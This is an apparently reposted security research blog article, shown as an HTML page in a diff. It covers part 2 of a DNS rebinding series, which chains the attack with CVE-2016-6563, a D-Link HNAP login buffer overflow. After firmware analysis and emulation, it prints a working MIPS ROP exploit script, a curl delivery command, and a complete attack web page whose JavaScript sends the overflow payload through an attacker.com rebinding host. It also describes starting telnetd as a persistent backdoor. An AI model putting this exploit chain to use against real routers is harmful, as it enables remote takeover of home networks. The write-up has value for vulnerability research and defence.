@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<style type=text/css>body{font-family:monospace;}</style>
+	<title>A Journey Into the Beauty of DNSRebinding - Part 2</title>
+	
+	
+	<link rel="stylesheet" href="/css/style.css">
+	
+	
+</head>
+<body>
+	<header>
+	==========================<br>
+	== <a href="https://ghariib.ir/">Gharib Personal Blog</a> ==<br>
+	==========================
+	<div style="float: right;">A Techi Personal Blog</div><br>
+	<p>
+	<nav>
+			<a href="/"><b>Start</b></a>.
+			
+			
+			<a href="/posts/"><b>Posts</b></a>.
+			
+			<a href="/categories/"><b>Categories</b></a>.
+			
+			<a href="/tags/"><b>Tags</b></a>.
+			
+	</nav>
+	</p>
+	
+</header>
+
+	
+	<main>
+		<article>
+			<h1>A Journey Into the Beauty of DNSRebinding - Part 2</h1>
+			<b><time>22.01.2025 00:00</time></b>
+		       
+
+			<div>
+				<h4 id="heading">**</h4>
+<p>
+<figure>
+  <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiFUbwqScaadVAeGqh3JSxLZaH936SBrNxYcarxTAfoYRcIIQ_JkbhqxYQL8JweFLYA3rtyNpQJw5shaJuNyzQ0V2BHSJvSdwPG18x0__WARFFboPLK3Bbx2Wytckpk73VP82HW9ghG861B/s0/DNS_2.jpg" alt="" />
+</figure>
+
+
+</p>
+<p>**</p>
+<h4 id="abstract"><strong>Abstract</strong></h4>
+<p>In the first part, after a fast overview on the <em>DNS Rebinding</em> technique, we considered a practical example in which UPnP services has been exploited to perform NAT Injection attacks and, therefore, expose internal services on Internet.</p>
+<p>In this second post we are going to demonstrate how <em>DNS Rebinding</em> could be used to exploit vulnerable services running locally in order to achieve Remote Code Execution (RCE). </p>
+<p>In particular, we will consider the case of CVE-2016-6563, which consists in a known Buffer Overflow issue caused by an unsafe parsing of the XML fields present in the login SOAP request affecting the HNAP service of some D-Link routers.</p>
+<p>In short, below are listed the steps in order to create a working <em>DNS Rebinding</em> proof of concept:</p>
+<ul>
+<li>Firmware static and dynamic analysis;</li>
+<li>Buffer Overflow sink and source identification through static binary analysis;</li>
+<li>Exploit development through binary emulation;</li>
+<li>DNS Rebinding + Buffer Overflow ROP exploit chaining.</li>
+</ul>
+<h4 id="static-firmware-and-binary-analysis">Static Firmware and Binary Analysis</h4>
+<p>As a first step, we downloaded the &ldquo;DIR-842_C1_FW300b18.bin&rdquo; firmware, which was available on the vendor site, and extracted the <em>squash-fs</em> filesystem by using <em>binwalk</em>.</p>
+<pre tabindex="0"><code>$ binwalk -e DIR-842_C1_FW300b18.bin ​DECIMAL       HEXADECIMAL     DESCRIPTION--------------------------------------------------------------------------------0             0x0             DLOB firmware header, boot partition: &#34;dev=/dev/mtdblock/5&#34;112           0x70            uImage header, header size: 64 bytes, header CRC: 0x6A7785EB, created: 2017-05-19 16:57:27, image size: 1226247 bytes, Data Address: 0x80060000, Entry Point: 0x80060000, data CRC: 0xCD5C9222, OS: Linux, CPU: MIPS, image type: Multi-File Image, compression type: lzma, image name: &#34;MIPS Seattle Linux-3.3.8&#34;184           0xB8            LZMA compressed data, properties: 0x6D, dictionary size: 8388608 bytes, uncompressed size: 3616252 bytes1245296       0x130070        PackImg section delimiter tag, little endian size: 15765760 bytes; big endian size: 9564160 bytes1245328       0x130090        Squashfs filesystem, little endian, version 4.0, compression:xz, size: 9563526 bytes, 2480 inodes, blocksize: 131072 bytes, created: 2017-05-19 16:57:32​
+</code></pre><p>Then we stared to inspect the &ldquo;hnap&rdquo; binary inside the filesystem and we found the same behavior described in CVE-2016-6563.</p>
+<p>We have then reversed the target binary with <em>Ghidra</em> and, by looking for the the strings related to the login parameters, we have identified the following function, which was renamed as &ldquo;Vulnerable&rdquo; in the following snippet of code.</p>
+<pre tabindex="0"><code>undefined4 Vulnerable(char *param_1)​{  undefined4 uVar1;  int iVar2;  size_t sVar3;  char *pcVar4;  undefined4 local_758;  undefined4 local_750;  char *local_74c;  char *local_748;  undefined auStack1860 [4];  undefined4 local_740;  char acStack1852 [80];  char acStack1772 [144];  char acStack1628 [64];  char acStack1564 [64];  undefined2 local_5dc;  char acStack1484 [64];  char acStack1420 [68];  char acStack1352 [64];  char Action [128];  char Username [128];  char Password [128];  undefined Captcha [128];  undefined auStack776 [10];  undefined auStack766 [20];  undefined auStack746 [98];  char acStack648 [64];  char acStack584 [64];  undefined auStack520 [64];  char acStack456 [64];  char acStack392 [128];  char acStack264 [128];  char acStack136 [128];    memset(Action,0,0x80);  memset(Username,0,0x80);  memset(Password,0,0x80);  memset(Captcha,0,0x80);  memset(auStack776,0,0x80);  memset(acStack648,0,0x40);  memset(acStack584,0,0x40);  memset(auStack520,0,0x40);  memset(acStack456,0,0x40);  memset(acStack392,0,0x80);  memset(acStack264,0,0x80);  DAT_00433260 = FUN_0041e620();  local_758 = 0;  FUN_004057ec(FUN_00419794,0,0x10000);  uVar1 = FUN_0041edb4(DAT_00433260);  VulnerableCalled(uVar1,&#34;Action&#34;,Action);  uVar1 = FUN_0041edb4(DAT_00433260);  VulnerableCalled(uVar1,&#34;Username&#34;,Username);  uVar1 = FUN_0041edb4(DAT_00433260);  VulnerableCalled(uVar1,&#34;LoginPassword&#34;,Password);  uVar1 = FUN_0041edb4(DAT_00433260);  VulnerableCalled(uVar1,&#34;Captcha&#34;,Captcha);    . . .
+</code></pre><p>The &ldquo;Action&rdquo;, &ldquo;Username&rdquo;, &ldquo;LoginPassword&rdquo; and &ldquo;Captcha&rdquo; XML fields are parsed by the (renamed) &ldquo;VulnerableXMLParser&rdquo; method:</p>
+<pre tabindex="0"><code>void VulnerableXMLParser(char *controllable_input,undefined4 param_2,char *destination_buffer)​{  size_t length_param;  char *p;  char *pcVar1;  char var_overflow [1024];  char acStack2060 [1024];  char EOT [1028];    sprintf(acStack2060,&#34;&lt;%s&gt;&#34;,param_2);  sprintf(EOT,&#34;&lt;/%s&gt;&#34;,param_2);  length_param = strlen(acStack2060);  p = strstr(controllable_input,acStack2060);  if (p != (char *)0x0) {    p = p + length_param;    pcVar1 = strstr(p,EOT);    if ((pcVar1 != (char *)0x0) &amp;&amp; (pcVar1 = pcVar1 + -(int)p, -1 &lt; (int)pcVar1)) {      strlcpy(var_overflow,p,pcVar1 + 1);      var_overflow[(int)pcVar1] = &#39;&#39;;      strcpy(destination_buffer,var_overflow);    }  }  return;}
+</code></pre><p>Here the user-controllable input present in the login parameter tags is copied in an insecure way:</p>
+<ul>
+<li>inside a local buffer (i.e. &ldquo;var_overflow&rdquo;);</li>
+<li>into the 128 byte buffer defined inside the caller function through the &ldquo;destination_buffer&rdquo; pointer.</li>
+</ul>
+<h4 id="firmware-emulation-and-binary-debugging"><strong>Firmware Emulation and Binary</strong> Debugging</h4>
+<p>In order to try to exploit the issue we have tried to emulate the firmware. We then used <em>FAT</em> in order to achieve full system emulation:</p>
+<pre tabindex="0"><code># ./fat.py ../fwrs/DIR-842_C1_FW300b18.bin ​                               __          _                              / _|         | |                             | |_    __ _  | |_                             |  _|  / _` | | __|                             | |  | (_| | | |_                             |_|   __,_|  __|​                Welcome to the Firmware Analysis Toolkit - v0.3    Offensive IoT Exploitation Training http://bit.do/offensiveiotexploitation                  By Attify - https://attify.com  | @attifyme    [+] Firmware: DIR-842_C1_FW300b18.bin[+] Extracting the firmware...[+] Image ID: 1[+] Identifying architecture...[+] Architecture: mipseb[+] Building QEMU disk image...[+] Setting up the network connection, please standby...[+] Network interfaces: [(&#39;br0&#39;, &#39;192.168.0.1&#39;), (&#39;br1&#39;, &#39;192.168.7.1&#39;)][+] All set! Press ENTER to run the firmware...[+] When running, press Ctrl + A X to terminate qemuCreating TAP device tap1_0...Set &#39;tap1_0&#39; persistent and owned by uid 0Initializing VLAN...Bringing up TAP device...attify123Adding route to 192.168.0.1...Starting firmware emulation... use Ctrl-a + x to exit[    0.000000] Linux version 2.6.32.70 (vagrant@vagrant-ubuntu-trusty-64) (gcc version 5.3.0 (GCC) ) #1 Thu Feb 18 01:39:21 UTC 2016[    0.000000] [    0.000000] LINUX started...[    0.000000] bootconsole [early0] enabled[    0.000000] CPU revision is: 00019300 (MIPS 24Kc)[    0.000000] FPU revision is: 00739300[    0.000000] Determined physical RAM map:​
+</code></pre><p>
+<figure>
+  <img src="https://1.bp.blogspot.com/-1jT-WOTJDLE/YF3_i8DQ_QI/AAAAAAAAAAM/TZ6SwtBI5eA3O4TTcKRdfhw8eNN-EgIIQCLcBGAsYHQ/w652-h248/dlink.png" alt="" />
+</figure>
+
+
+</p>
+<p>However, we have used the <em>QEMU</em> user-mode emulation feature with the aim of debugging the issue and creating a working exploit.</p>
+<p>In particular, the following setting was used to emulate a HTTP request to the target <em>mips</em> &ldquo;hnap&rdquo; service:</p>
+<pre tabindex="0"><code>sudo chroot . ./qemu-mips-static -E HTTP_SOAPACTION=&#34;http://purenetworks.com/HNAP1/Login&#34; -E HTTP_HNAP_AUTH=&#34;69201619B75DDDFF967E6ADD87BA945F 1583432673&#34; -E REQUEST_URI=&#34;/HNAP1/&#34; -E REQUET_METHOD=&#34;POST&#34; -E HTTP_COOKIE=&#34;uid=99TIA1AP7&#34; -E CONTENT_LENGTH=2640 -E CONTENT_TYPE=&#34;text/xml; charset=utf-8&#34; -g 4444 ./htdocs/HNAP1/hnap
+</code></pre><p>Following the description of the used parameters:</p>
+<ul>
+<li><em>chroot</em>: the full command was executed within the root directory of the extracted <em>squash-fs</em> filesystem, so <em>chroot .</em> makes this directory the root directory;</li>
+<li><em>qemu-mips-static</em>: allows to emulate MIPS binaries. The &ldquo;-E&rdquo; options was used to set some environment variables required by &ldquo;hnap&rdquo; to regularly invoke the vulnerable method; &ldquo;-g&rdquo; sets the &ldquo;QEMU_GDB&rdquo; environment variable that opens a <em>gdb-server</em> on the specified port (in this case port 4444).</li>
+</ul>
+<p>It was then possible to attach to the <em>gdb-server</em> running on &ldquo;localhost:4444&rdquo; and debugging the target binary using <em>gdb-multiarch</em> as follows:</p>
+<pre tabindex="0"><code>$ gdb-multiarch GNU gdb (Ubuntu 8.1-0ubuntu3.2) 8.1.0.20180409-gitCopyright (C) 2018 Free Software Foundation, Inc.License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;This is free software: you are free to change and redistribute it.There is NO WARRANTY, to the extent permitted by law.  Type &#34;show copying&#34;and &#34;show warranty&#34; for details.This GDB was configured as &#34;x86_64-linux-gnu&#34;.Type &#34;show configuration&#34; for configuration details.For bug reporting instructions, please see:&lt;http://www.gnu.org/software/gdb/bugs/&gt;.Find the GDB manual and other documentation resources online at:&lt;http://www.gnu.org/software/gdb/documentation/&gt;.For help, type &#34;help&#34;.Type &#34;apropos word&#34; to search for commands related to &#34;word&#34;.(gdb) file htdocs/HNAP1/hnap Reading symbols from htdocs/HNAP1/hnap...(no debugging symbols found)...done.(gdb) target remote 127.0.0.1:4444Remote debugging using 127.0.0.1:4444warning: remote target does not support file transfer, attempting to access files from local filesystem.Reading symbols from ~/firmware/fwrs/_DIR-842_C1_FW300b18.bin.extracted/squashfs-root/lib/ld-uClibc-0.9.33.2.so...(no debugging symbols found)...done.0x7f7e7f90 in _start () from ~/firmware/fwrs/_DIR-842_C1_FW300b18.bin.extracted/squashfs-root/lib/ld-uClibc-0.9.33.2.so(gdb) cContinuing.​
+</code></pre><h4></h4>
+<h4 id="a-working-buffer-overflow-exploit"><strong>A working Buffer Overflow exploit</strong></h4>
+<p>After some digging into the analysis both user-mode and system-mode, we got a running ROP exploit that allowed us to execute an arbitrary command by jumping to the <em>ld-uClibc-0.9.33.2</em> <em>system()</em> function:</p>
+<pre tabindex="0"><code>from pwn import *​def p32_big(data):        return p32(data, endian = &#39;big&#39;)​libc_text_base = 0x2aae4000libc_text_start  = 0x0libc_system = libc_text_base + (0x00062104 - libc_text_start)gadget1 = libc_text_base + (0x00042e08 - libc_text_start)# identified gadget# 0x00042e08 : sw $v0, 0xa8($sp) ; addiu $a0, $sp, 0xb8 ; lw $t9, 0x24($sp) ; jalr $t9 ; move $a1, $s6payload = &#34;A&#34; * 1028 + p32_big(gadget1)payload += &#34;BBBB&#34; # $sp points herepayload += &#34;C&#34; * 32payload += p32_big(libc_system)payload += &#34;C&#34; * 144payload += &#34;touch /tmp/minded;&#34; # here the command to executesoap_body = &#34;&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;&lt;soap:Envelope xmlns:xsi=&#34;http://www.w3.org/2001/XMLSchema-instance&#34; xmlns:xsd=&#34;http://www.w3.org/2001/XMLSchema&#34; xmlns:soap=&#34;http://schemas.xmlsoap.org/soap/envelope/&#34;&gt;&lt;soap:Body&gt;&lt;Login xmlns=&#34;http://purenetworks.com/HNAP1/&#34;&gt;&lt;Action&gt;request&lt;/Action&gt;&lt;Username&gt;Admin&lt;/Username&gt;&lt;LoginPassword&gt;&#34; + payload + &#34;&lt;/LoginPassword&gt;&lt;Captcha&gt;&lt;/Captcha&gt;&lt;/Login&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;&#34;​print(soap_body)
+</code></pre><p>The following gadget was found in the libc address and used to perform a return-to-system:</p>
+<pre tabindex="0"><code>0x00042e08 : sw $v0, 0xa8($sp) ; addiu $a0, $sp, 0xb8 ; lw $t9, 0x24($sp) ; jalr $t9 ; move $a1, $s6
+</code></pre><p>The gadget allows to jump to the next instruction through <code>jalr $t9</code> and <code>lw $t9, 0x24($sp)</code>; so we put the address of <em>system()</em> 36 bytes after the current pointed address. </p>
+<p>The argument of <em>system()</em>, was previously controlled thanks to <code>addiu $a0, $sp, 0xb8</code>, which points to the stack location that contains the command to execute.</p>
+<p>Once adjusted the <em>libc</em> base address according to the system-mode, we could test the exploit by using <em>curl</em> (the body file contains the output of the python exploit):</p>
+<pre tabindex="0"><code>$ curl -X POST -d @body http://192.168.0.1/HNAP1/ -H &#39;SOAPAction: http://purenetworks.com/HNAP1/Login&#39; -H &#39;HNAP_AUTH: 7A6EA9269CBB71629F4EF2926343C7A1 1583173034&#39; -H &#39;Content-Type: text/xml; charset=utf-8&#39;&lt;title&gt;500 Internal Server Error&lt;/title&gt;&lt;h1&gt;500 Internal Server Error&lt;/h1&gt;​
+</code></pre><p>The &ldquo;touch /tmp/minded&rdquo; command was successfully executed as this file was written in the &ldquo;/tmp&rdquo; directory of the emulated firmware. </p>
+<p>The following output is related to <em>FAT</em> and shows the emulated router console exposing the <em>SIGSEGV</em> crash caused by the running exploit. </p>
+<pre tabindex="0"><code># [ 5278.120000] do_page_fault() #2: sending SIGSEGV to hnap for invalid read access from[ 5278.120000] 68202f90 (epc == 2ab26e20, ra == 2ab26e1c)[ 5278.120000] Cpu 0[ 5278.120000] $ 0   : 00000000 1000a400 68202f74 00000001[ 5278.120000] $ 4   : 2ab64000 7f80be50 00000000 00000000[ 5278.120000] $ 8   : 00000000 80104960 8f06cc98 0000000a[ 5278.124000] $12   : 00000008 811e41c0 00000000 00000000[ 5278.124000] $16   : 7f80cd88 2ab44000 004013b8 0049e444[ 5278.124000] $20   : 00487ec0 0049e88c 004a0000 00000000[ 5278.124000] $24   : 8f3cc4f0 2ab1db80                  [ 5278.124000] $28   : 2ab65400 7f80bea0 41414141 2ab26e1c[ 5278.124000] Hi    : 00000000[ 5278.124000] Lo    : 00000000[ 5278.124000] epc   : 2ab26e20 0x2ab26e20[ 5278.124000]     Not tainted[ 5278.124000] ra    : 2ab26e1c 0x2ab26e1c[ 5278.124000] Status: 0000a413    USER EXL IE [ 5278.124000] Cause : 10800008[ 5278.124000] BadVA : 68202f90[ 5278.124000] PrId  : 00019300 (MIPS 24Kc)[ 5278.124000] Modules linked in:[ 5278.124000] Process hnap (pid: 20107, threadinfo=8f1b6000, task=8f2bd6e0, tls=2aab7440)[ 5278.124000] Stack : 42424242 43434343 43434343 43434343 43434343 43434343 43434343 43434343[ 5278.124000]         43434343 2ab46104 43434343 43434343 43434343 43434343 43434343 43434343[ 5278.128000]         43434343 43434343 43434343 43434343 43434343 43434343 43434343 43434343[ 5278.128000]         43434343 43434343 43434343 43434343 43434343 43434343 43434343 43434343[ 5278.128000]         43434343 43434343 43434343 43434343 43434343 43434343 43434343 43434343[ 5278.128000]         ...[ 5278.128000] Call Trace:[ 5278.128000] [ 5278.128000] [ 5278.128000] Code: 0320f809  02c02821  8fa200bc &lt;8c59001c&gt; 13200004  8fbc0018  0320f809  27a400b8  8fbc0018 [ 5278.128000] hnap/20107: potentially unexpected fatal signal 11.[ 5278.128000] [ 5278.128000] Cpu 0[ 5278.128000] $ 0   : 00000000 1000a400 68202f74 00000001[ 5278.132000] $ 4   : 2ab64000 7f80be50 00000000 00000000[ 5278.132000] $ 8   : 00000000 80104960 8f06cc98 0000000a[ 5278.132000] $12   : 00000008 811e41c0 00000000 00000000[ 5278.132000] $16   : 7f80cd88 2ab44000 004013b8 0049e444[ 5278.132000] $20   : 00487ec0 0049e88c 004a0000 00000000[ 5278.132000] $24   : 8f3cc4f0 2ab1db80                  [ 5278.132000] $28   : 2ab65400 7f80bea0 41414141 2ab26e1c[ 5278.132000] Hi    : 00000000[ 5278.132000] Lo    : 00000000[ 5278.132000] epc   : 2ab26e20 0x2ab26e20[ 5278.132000]     Not tainted[ 5278.132000] ra    : 2ab26e1c 0x2ab26e1c[ 5278.132000] Status: 0000a413    USER EXL IE [ 5278.132000] Cause : 10800008[ 5278.132000] BadVA : 68202f90[ 5278.132000] PrId  : 00019300 (MIPS 24Kc)
+</code></pre><p>Following the proof of the execution of the <em>touch</em> command (of the <em>minded</em> file).</p>
+<pre tabindex="0"><code># ls /tmp/server.key     wburfe         wifi0.caldata mindedserver.crt     hapfie         wifi1.caldata​
+</code></pre><h4 id="remote-command-execution-through-dns-rebinding-attack">Remote Command Execution through DNS Rebinding attack</h4>
+<p>It was then possible to embed the generated payload inside an <em>xhr</em> SOAP request in the <em>DNS Rebinding</em> HTML attack page we used in the first part:</p>
+<pre tabindex="0"><code>&lt;html&gt;&lt;head&gt;    &lt;script src=&#34;jquery.min.js&#34;&gt;&lt;/script&gt;    &lt;script&gt;                function exploit()        {            var xhr = new XMLHttpRequest();            xhr.open(&#34;POST&#34;, &#34;http://127-0-0-1.192-168-0-1.attacker.com/HNAP1/&#34;, true);            xhr.setRequestHeader(&#34;Accept&#34;, &#34;*/*&#34;);            xhr.setRequestHeader(&#34;Content-Type&#34;, &#34;text/xml; charset=utf-8&#34;);            xhr.setRequestHeader(&#34;SOAPAction&#34;,&#34;http://purenetworks.com/HNAP1/Login&#34;);            xhr.setRequestHeader(&#34;HNAP_AUTH&#34;,&#34;7A6EA9269CBB71629F4EF2926343C7A1 1583173034&#34;);            xhr.withCredentials = true;            var body = &#34;x3c?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?x3ex3csoap:Envelope xmlns:xsi=&#34;http://www.w3.org/2001/XMLSchema-instance&#34; xmlns:xsd=&#34;http://www.w3.org/2001/XMLSchema&#34; xmlns:soap=&#34;http://schemas.xmlsoap.org/soap/envelope/&#34;x3ex3csoap:Bodyx3ex3cLogin xmlns=&#34;http://purenetworks.com/HNAP1/&#34;x3ex3cActionx3erequestx3c/Actionx3ex3cUsernamex3eAdminx3c/Usernamex3ex3cLoginPasswordx3eAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA*xb2nx08BBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC*xb4ax04CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCtouch /tmp/testJSx3c/LoginPasswordx3ex3cCaptchax3ex3c/Captchax3ex3c/Loginx3ex3c/soap:Bodyx3ex3c/soap:Envelopex3e&#34;;            var aBody = new Uint8Array(body.length);            for (var i = 0; i &lt; aBody.length; i++)            aBody[i] = body.charCodeAt(i);             xhr.send(new Blob([aBody]));        }​        var trigger = true;        function start() {           jQuery.ajax ({                url: &#34;/info/Login.html&#34;,                type: &#34;GET&#34;,                data: &#34;&#34;,                 }).always(function (data,status){                    console.log(&#34;[+] Checking SOP bypass...&#34;);                    if(trigger &amp;&amp; data.includes(&#34;&lt;title&gt;D-LINK&lt;/title&gt;&#34;)){                       console.log(&#34;[+] Sending Exploit...&#34;);                        exploit();                        trigger = false;                    }else{                        console.log(&#34;[+] Waiting...&#34;);                    }                });        }        function poll() {            setTimeout(function () {                if(trigger){                    start();                    poll();                }else{                    console.log(&#34;[+] Exploit sent...&#34;)                }            }, 6000);        }​        $(document).ready(function () {            poll();        });    &lt;/script&gt;&lt;/head&gt;​&lt;body&gt;    &lt;h1&gt;DNS Rebinding Attack against Dlink Router CVE-XXXXX&lt;/h1&gt;    &lt;br&gt;&lt;br&gt;&lt;br&gt;    &lt;marquee&gt;Insert here something...&lt;/marquee&gt;&lt;/body&gt;&lt;/html&gt;​
+</code></pre><p>Below the screenshot showing the execution of the <em>xhr</em> request after the successful <em>DNS Rebinding</em> attack.</p>
+<p>The exploit was successfully executed and the &ldquo;testJS&rdquo; file was created on the filesystem of the router.</p>
+<p>
+<figure>
+  <img src="https://lh6.googleusercontent.com/leubTyJ0ntk7VNyq9qnw3ecIvgy8pUsmDUzNKSYHVhMGWIMNWcCCTJCrRGvO86Fj5V4lA_4BwmytjJab8TuiWCTPk11xnu68gveS3UujPtDNrZtu17GVtp1iQYxzDYCX_jKbuK_o2NM=w320-h172" alt="" />
+</figure>
+
+
+</p>
+<p>Following the complete <em>DNS Rebinding</em> attack scheme.</p>
+<p>
+<figure>
+  <img src="https://1.bp.blogspot.com/-8Lrxd-1VER0/YH76iiJdq0I/AAAAAAAAABU/JcytQ5XcerYnjtdBEB7ySHX-OT2s1hBIQCLcBGAsYHQ/w320-h205/rop_diagram.png" alt="" />
+</figure>
+
+
+</p>
+<h4></h4>
+<h4 id="getting-persistence-using-dns-rebinding--upnp-nat-injection-"><strong>Getting Persistence using DNS Rebinding + UPnP NAT Injection + <em>telnetd</em> service</strong></h4>
+<p>The next step for an attacker would be to create a backdoor in order to get persistent access to the victim&rsquo;s device.</p>
+<p>During the static firmware analysis we noticed the existence of &ldquo;/usr/sbin/telnetd&rdquo; within the firmware, so we could force the router to run the <em>telnetd</em> service just by replacing his path in the working exploit. </p>
+<p>Following the generated HTTP request.</p>
+<p>
+<figure>
+  <img src="https://1.bp.blogspot.com/-JF6kxyfsdl0/YImNNQ0h6-I/AAAAAAAAABs/0LUssnx8LYogCBOq9EHn_-oYzwikFJRMQCLcBGAsYHQ/s16000/Screenshot_20210428_182757.png" alt="" />
+</figure>
+
+
+</p>
+<p>The service was executed on the machine as shown in the following screenshot that shows the <em>nmap</em> output before and after the exploit execution.</p>
+<p>Telnet service status before the exploit execution:</p>
+<p>
+<figure>
+  <img src="https://lh3.googleusercontent.com/-mGvtiQBYH6k/YQQdwY-1RBI/AAAAAAAAAEk/_BJQ72Uuz0Ia3YrF6KR84NdQGHi8nZVjACLcBGAsYHQ/image.png" alt="" />
+</figure>
+
+
+</p>
+<p>Telnet service started after the exploit execution:</p>
+<p>
+<figure>
+  <img src="https://lh3.googleusercontent.com/-Fv5cuUPF9MU/YQQeFFyZnvI/AAAAAAAAAEs/fi7C74UrmFIIzdDB9xXqruoalaKhUoGTQCLcBGAsYHQ/image.png" alt="" />
+</figure>
+
+
+</p>
+<p>
+<figure>
+  <img src="https://lh3.googleusercontent.com/-YL2v9UJ0ubM/YQQeJdfoBFI/AAAAAAAAAEw/MqhaKelVYVUeeou6hxM5QmtEMNvwlcjaQCLcBGAsYHQ/image.png" alt="" />
+</figure>
+
+
+</p>
+<h4 id="conclusion">Conclusion</h4>
+<p>We were able to use the <em>DNS Rebinding</em> attack against CVE-2016-6563 proving that it is possible to execute a Remote Command Execution against a not public facing service, as the web interface of a router.</p>
+<p>Moreover, we have used the <em>UPnP</em> <em>NAT Injection</em> technique from the first part to expose the <em>telnetd</em> service to the public interface in order to get a remote backdoor.</p>
+<p>Below the Attack Tree of the proposed attack:</p>
+<p>
+<figure>
+  <img src="https://1.bp.blogspot.com/-GIJHLg9xXsU/YKU1jprlCEI/AAAAAAAAACM/aJA5ejcEpvcQRqFfyj6-Ta2eQrxX9BtEQCLcBGAsYHQ/w490-h408/Screenshot_20210519_175741.png" alt="" />
+</figure>
+
+
+</p>
+<h4 id="references">References:</h4>
+<ul>
+<li><a href="https://eu.dlink.com/uk/en/support/support-news/2016/november/10/routers-hnap-service-stack-based-buffer-overflow-vulnerability">https://eu.dlink.com/uk/en/support/support-news/2016/november/10/routers-hnap-service-stack-based-buffer-overflow-vulnerability</a></li>
+<li><a href="https://packetstormsecurity.com/files/139611/D-Link-DIR-Routers-HNAP-Login-Stack-Buffer-Overflow.html">https://packetstormsecurity.com/files/139611/D-Link-DIR-Routers-HNAP-Login-Stack-Buffer-Overflow.html</a></li>
+<li><a href="https://www.rapid7.com/db/modules/exploit/linux/http/dlink">https://www.rapid7.com/db/modules/exploit/linux/http/dlink</a>_hnap_bof/</li>
+</ul>
+<h4 id="authors"><strong>Authors</strong></h4>
+<p>Alessandro Braccio</p>
+<p>Giovanni Guido</p>
+<p>Go to Source</p>
+
+			</div>
+		</article>
+	</main>
+<aside>
+	<div>
+		<div>
+			<h3>LATEST POSTS</h3>
+		</div>
+		<div>
+			<ul>
+				
+				<li><a href="/posts/2025-03-20-srsly-risky-biz-chinas-mss-gets-persona/">Srsly Risky Biz Chinas MSS gets personal</a></li>
+				
+				<li><a href="/posts/2025-03-19-risky-bulletin-google-buys-wiz-for-32-b/">Risky Bulletin Google buys Wiz for 32 billion</a></li>
+				
+				<li><a href="/posts/apple-inc-sent-you-a-payment-request-payoneer-invoices-other-microsoft-enabled-scams/">“Apple Inc sent you a payment request” Payoneer invoices; other Microsoft-enabled scams</a></li>
+				
+				<li><a href="/posts/glasses-that-transcribe-text-to-audio/">“Glasses” That Transcribe Text To Audio</a></li>
+				
+				<li><a href="/posts/5-best-linux-centos-replacement-options-alternatives/">&lt;div&gt;5 Best Linux CentOS Replacement Options &amp; Alternatives&lt;/div&gt;</a></li>
+				
+			</ul>
+		</div>
+	</div>
+</aside>
+
+
+	<footer>
+	<p>&copy; 2025 <a href="https://ghariib.ir/"><b>Alireza Gharib. All right reserved</b></a>.
+	<a href="https://github.com/Gharib110"><b>Github</b></a>.
+	</p>
+</footer>
+
+</body>
+</html>
